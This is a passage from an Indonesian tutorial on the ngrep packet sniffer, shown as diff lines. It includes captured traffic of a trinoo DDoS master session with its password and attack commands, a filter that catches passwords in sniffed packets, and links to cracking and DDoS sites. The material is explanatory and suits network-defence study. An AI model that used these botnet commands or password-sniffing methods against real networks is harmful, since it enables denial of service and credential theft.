+     6f 74 61 6c 2e 0a 74 72    69 6e 6f 6f 3e 20          otal..trinoo>   
+   ##
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     6d 74 69 6d 65 72 20 31    30 30 30 0d 0a             mtimer 1000..     
+   ##
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     6d 74 69 6d 65 72 3a 20    53 65 74 74 69 6e 67 20    mtimer: Setting 
+     74 69 6d 65 72 20 6f 6e    20 62 63 61 73 74 20 74    timer on bcast t
+     6f 20 31 30 30 30 2e 0a                               o 1000..          
+   #
+   U 10.0.0.1:1025 -> 192.168.0.1:27444
+     62 62 62 20 6c 34 34 61    64 73 6c 20 31 30 30 30    bbb l44adsl 1000
+   ##
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     6d 74 69 6d 65 72 3a 20    53 65 74 74 69 6e 67 20    mtimer: Setting 
+     74 69 6d 65 72 20 6f 6e    20 62 63 61 73 74 20 74    timer on bcast t
+     6f 20 31 30 30 30 2e 0a                               o 1000..          
+   ###
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     74 72 69 6e 6f 6f 3e 20                               trinoo>         
+   ###
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     6d 73 69 7a 65 20 33 32    30 30 30 0d 0a             msize 32000..     
+   #
+   U 10.0.0.1:1025 -> 192.168.0.1:27444
+     72 73 7a 20 33 32 30 30    30                         rsz 32000         
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     74 72 69 6e 6f 6f 3e 20                               trinoo>         
+   ###
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     64 6f 73 20 32 31 36 2e    31 36 30 2e 58 58 2e 59    dos 216.160.XX.Y
+     59 0d 0a                                              Y..             
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     44 6f 53 3a 20 50 61 63    6b 65 74 69 6e 67 20 32    DoS: Packeting 2
+     31 36 2e 31 36 30 2e 58    58 2e 59 59 2e 0a          16.160.XX.YY..  
+   #
+   U 10.0.0.1:1025 -> 192.168.0.1:27444
+     61 61 61 20 6c 34 34 61    64 73 6c 20 32 31 36 2e    aaa l44adsl 216.
+     31 36 30 2e 58 58 2e 59    59                         160.XX.YY       
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     74 72 69 6e 6f 6f 3e 20                               trinoo>         
+   ##
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     71 75 69 74 0d 0a                                     quit..          
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     62 79 65 20 62 79 65 2e    0a                         bye bye..       
+   ###
+   T 192.168.100.1:1075 -> 10.0.0.1:27665 [AP]
+     62 65 74 61 61 6c 6d 6f    73 74 64 6f 6e 65 0d 0a    betaalmostdone..
+   ##
+   T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+     74 72 69 6e 6f 6f 20 76    31 2e 30 37 64 32 2b 66    trinoo v1.07d2+f
+     33 2b 63 2e 2e 5b 72 70    6d 38 64 2f 63 62 34 53    3+c..[rpm8d/cb4S
+     78 2f 5d 0a 0a 0a                                     x/]...          
+   ###
+   T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+     74 72 69 6e 6f 6f 3e 20                               trinoo>         
+   ###
+   T 192.168.100.1:1075 -> 10.0.0.1:27665 [AP]
+     6d 70 69 6e 67 0d 0a                                  mping..         
+   ##
+   T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+     6d 70 69 6e 67 3a 20 53    65 6e 64 69 6e 67 20 61    mping: Sending a
+     20 50 49 4e 47 20 74 6f    20 65 76 65 72 79 20 42    PING to every B
+     63 61 73 74 73 2e 0a                                  casts..         
+   #
+   U 10.0.0.1:1025 -> 192.168.0.1:27444
+     70 6e 67 20 6c 34 34 61    64 73 6c                   png l44adsl     
+   ##
+   U 192.168.0.1:32894 -> 10.0.0.1:31335
+     50 4f 4e 47                                           PONG            
+   ##
+   T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+     74 72 69 6e 6f 6f 3e 20    50 4f 4e 47 20 31 20 52    trinoo> PONG 1 R
+     65 63 65 69 76 65 64 20    66 72 6f 6d 20 31 39 32    eceived from 192
+     2e 31 36 38 2e 30 2e 31    0a                         .168.0.1
+   ##
+   T 192.168.100.1:1075 -> 10.0.0.1:27665 [AP]
+     71 75 69 74 0d 0a                                     quit..          
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1075 [AP]
+     62 79 65 20 62 79 65 2e    0a                         bye bye..    
+
+2. Contoh di bawah ini akan menangkap paket-paket yang berisi
+   pattern "ssword" dan menampilkannya dalam format alternatif 
+   (yang menurut saya lebih gampang kebaca):
+
+   # ngrep -x ssword
+   interface: eth0 (192.168.1.0/255.255.255.0)
+      match: ssword 
+      ################################ 
+      T 192.168.1.20:23 -> 192.168.1.10:1056 [AP] 
+      50 61 73 73 77 6f 72 64           3a  20                               Password: 
+      #########################exit 
+      59 received, 0 dropped
+      [....................] # 
+
+3. Untuk melakukan pinging cuke :
+
+     # ngrep -e -x host 192.168.1.10
+     interface: eth0 (192.168.1.0/255.255.255.0)
+     filter: ip and ( host 192.168.1.10 ) 
+
+     #
+      I 192.168.1.10 -> 192.168.2.10 8:0 
+      eb 07 00 00 31 86 a7 39      5e cd 0e 00 08 09 0a 0b                   ....1..9^.............
+      0c 0d 0e 0f 10 11 12 13      14 15 16 17 18 19 1a 1b                   ......................
+      1c 1d 1e 1f 20 21 22 23      24 25 26 27 28 29 2a 2b                   .... !"#$%&'()*+
+      2c 2d 2e 2f 30 31 32 33      34 35 36 37                                ,-./01234567 
+
+     #
+     I 192.168.1.1 -> 192.168.1.10 5:1 
+     c0 a8 01 0b 45 00 00 54     25 f2 00 00 40 01 d0 52                     ....E..T%...@..R
+     c0 a8 01 0a c0 a8 02 0a     08 00 dc 67 eb 07 00 00                     ...........g..........
+     31 86 a7 39 5e cd 0e 00     08 09 0a 0b 0c 0d 0e 0f 1                   ..9^..................
+     10 11 12 13 14 15 16 17     18 19 1a 1b 1c 1d 1e 1f                     ......................
+     20 21 22 23 24 25 26 27     28 29 2a 2b 2c 2d 2e 2f                     !"#$%&'()*+,-./
+     30 31 32 33 34 35 36 37     b4 04 01 00 06 00 00 00                      01234567..........
+     00 10 00 00 01 00 00 00     e8 40 00 00                                 .........@............
+     exit 
+     2 received, 0 dropped 
+     [..........................] #
+
+4. Untuk mengetahui lebih banyak tentang kombinasi perintah ngrep anda bisa :
+
+     # man ngrep
+
+
+C. Referensi    
+*******************************************************************
+
+David Dittrich
+http://staff.washington.edu/dittrich/
+
+Password cracking utilities:
+http://packetstorm.security.com/Crackers/
+
+hunt:
+http://www.cri.cz/kra/index.html
+
+tcpdump & Libpcap
+http://www.tcpdump.org/release.
+
+ngrep:
+http://dag.wieers.com/packages/ngrep/
+
+ngrep:
+http://www.packetfactory.net/Projects/ngrep
+
+sniffit:
+http://sniffit.rug.ac.be/sniffit/sniffit.html
+
+Lsof:
+ftp://vic.cc.purdue.edu/pub/tools/unix/lsof/
+
+Libnet:
+http://www.packetfactory.net/libnet/
+
+Cracker:
+http://www.crypto.dircon.co.uk
+
+Net::RawIP:
+http://quake.skiff.net/RawIP
+
+http://www.phrack.com
+
+http://rpm.pbone.net/index.php3/stat/4/idpl/2048/
+
+http://linux.maruhn.com/sec/libpcap.html
+
+http://www.netcraft.com
+
+http://www.ddosworld.com
+
+
+D. Greetz
+*******************************************************************
+
+S'to, dkk.
+http://www.jasakom.com
+
+Y3dips, dkk.
+http://www.echo.or.id 
+
+Senyumnet Crew:
+Tovan, Evan, Zipel, Cahyo, Riko, Wiwid, Abang Afudz, dll.
+
+My Sweety:
+Redhat Linux
+
+Temen-temen yang sering nongkrong di jasakom:
+"jambi_hacker, jambi_cracker dan jambi_lamer adalah bersaudara", yang 
+telah banyak menghibur kita semua....tul gak...heheh...semangat 
+terusss bro...awas loe jangan nakal yaa... 
+kadal_punk, mu5t_d13, si_cebol, gmt, ansy, PALUARED, , PeNcOpEt_CiNtA, 
+batamhacker, BinusHack, netmax, BadSectoR, POM_PONK, dll., sorry kalo 
+ada yang belom kesebut.
+
+*******************************hilman_hands*****************************EOF
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
